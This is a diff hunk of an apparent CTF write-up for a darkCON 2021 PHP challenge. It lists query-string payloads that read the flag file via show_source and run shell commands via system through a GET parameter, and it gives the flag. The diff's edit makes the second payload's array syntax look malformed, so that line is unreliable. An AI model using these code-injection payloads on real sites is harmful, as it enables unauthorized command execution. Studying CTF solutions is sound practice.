@@ -41,6 +41,6 @@ else {
 - i find fucntion `show_source` not disable and we can use move payload.
 ### Payload
 - use `show_source` -> ```?nic3=/CTF/e&bruh=show_source(glob("fl*")[0]);```
-- use move payload -> ```?nic3=/CTF/e&bruh=$_GET['cmd']("ls")&cmd=system;
+- use move payload -> ```?nic3=/CTF/e&bruh=$_GET[["cmd"]]("ls")&cmd=system;
 ### Flag
 - `darkCON{w3lc0me_D4rkC0n_CTF_2O21_ggwp!!!!}`
